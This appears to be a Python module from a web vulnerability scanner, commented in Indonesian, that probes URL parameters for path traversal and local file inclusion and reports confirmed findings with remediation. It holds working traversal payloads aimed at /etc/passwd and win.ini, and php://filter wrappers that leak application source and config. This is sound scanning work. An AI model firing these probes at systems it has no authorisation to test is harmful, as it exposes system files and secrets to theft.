"""Local File Inclusion / Path Traversal probes - dengan baseline & reproduction.

Verifikasi:
- Baseline body untuk URL target → kalau sudah memuat marker (misal dev page
  contoh /etc/passwd), kelompok itu di-skip.
- Payload Linux + Windows + PHP wrapper (php://filter) dengan beberapa
  encoding variant (URL, double, ``....//``, nullbyte).
- Match pakai regex spesifik (`root:x:0:0:`, `[fonts]`, base64 ``PD9waHA``).
- Reproduksi 1x untuk dapat ``confirmed``.
"""
from __future__ import annotations

import re

from cyberloka.active._helpers import (
    append_param,
    baseline,
    candidate_params,
    iter_param_urls,
)
from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.core.util import truncate

PASSWD_RE = re.compile(r"\broot:[x*!]?:0:0:[^:]*:/")
WIN_INI_RE = re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]", re.I)
PHP_FILTER_RE = re.compile(r"PD9waHA[A-Za-z0-9+/=]{20,}")

LINUX_PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "/etc/passwd%00",
    "../../../../etc/hostname",
]
WIN_PAYLOADS = [
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "C:\\windows\\win.ini",
    "/windows/win.ini",
]
PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=convert.base64-encode/resource=config.php",
]
PARAM_HINTS = ("file", "page", "path", "include", "doc", "filename", "view", "template")


def _confirm(client: HttpClient, mutated: str, regex: "re.Pattern[str]") -> bool:
    resp = client.get(mutated)
    return resp is not None and bool(regex.search(resp.text or ""))


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        url = target.base_url
        if "?" not in url:
            for cand in candidate_params(url, PARAM_HINTS):
                url = append_param(url, cand, "index")
                break

        base = baseline(client, url, samples=1)
        base_text = base["body"] if base else ""
        skip_passwd = bool(PASSWD_RE.search(base_text))
        skip_winini = bool(WIN_INI_RE.search(base_text))

        groups: list[tuple[str, list[str], "re.Pattern[str]"]] = []
        if not skip_passwd:
            groups.append(("Linux /etc/passwd", LINUX_PAYLOADS, PASSWD_RE))
        if not skip_winini:
            groups.append(("Windows win.ini", WIN_PAYLOADS, WIN_INI_RE))
        groups.append(("PHP source via php://filter", PHP_WRAPPERS, PHP_FILTER_RE))

        seen: set[tuple[str, str]] = set()

        for group_name, payloads, regex in groups:
            for payload in payloads:
                for param, mutated in iter_param_urls(url, payload):
                    if (param, group_name) in seen:
                        continue
                    resp = client.get(mutated)
                    if resp is None:
                        continue
                    body = resp.text or ""
                    m = regex.search(body)
                    if not m:
                        continue
                    confidence = "confirmed" if _confirm(client, mutated, regex) else "firm"

                    findings.append(
                        Finding(
                            module="lfi",
                            title=f"{group_name} via parameter `{param}` terverifikasi",
                            severity=Severity.CRITICAL,
                            description=(
                                "Konten file lokal (atau source code via php://filter) berhasil "
                                "dibaca lewat parameter aplikasi. Attacker dapat membaca config, "
                                "kunci privat, atau melakukan code-review aplikasi. Pada kondisi "
                                "tertentu LFI berlanjut ke RCE via log poisoning / session inclusion."
                            ),
                            target=mutated,
                            evidence=(
                                f"payload={payload!r}\n"
                                f"regex={regex.pattern!r}\n"
                                f"match={truncate(m.group(0), 160)}\n\n"
                                f"snippet:\n{truncate(body, 320)}"
                            ),
                            cwe="CWE-22",
                            confidence=confidence,
                            urls=[mutated],
                            remediation=(
                                "Jangan menerima path file dari user. Gunakan whitelist "
                                "identifier dan map ke path internal. Lakukan canonicalisasi "
                                "path lalu cek apakah tetap di dalam direktori yang diizinkan "
                                "(`os.path.commonpath`). Nonaktifkan PHP wrappers yang tidak "
                                "perlu (`allow_url_include=Off`)."
                            ),
                            references=[
                                "https://owasp.org/www-community/attacks/Path_Traversal",
                                "https://cwe.mitre.org/data/definitions/22.html",
                            ],
                        )
                    )
                    seen.add((param, group_name))
                    break
    finally:
        client.close()
    return findings
